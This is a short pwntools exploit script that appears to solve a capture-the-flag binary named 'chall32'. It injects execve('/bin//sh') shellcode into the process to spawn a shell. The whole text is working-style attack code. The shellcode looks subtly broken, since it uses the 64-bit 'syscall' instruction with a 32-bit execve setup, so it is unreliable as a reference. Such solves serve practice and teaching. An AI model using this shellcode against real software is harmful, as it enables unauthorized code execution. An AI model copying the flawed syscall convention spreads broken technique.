from pwn import *
context.log_level="DEBUG"
context.binary = './chall32'
r = process("./chall32")
r.sendline(asm("""
xor     eax, eax
push    eax
push     0x68732f2f
push     0x6e69622f
mov     ebx, esp
mov     ecx, 0
mov     edx, 0
mov     eax, 11
syscall
"""))
r.interactive()
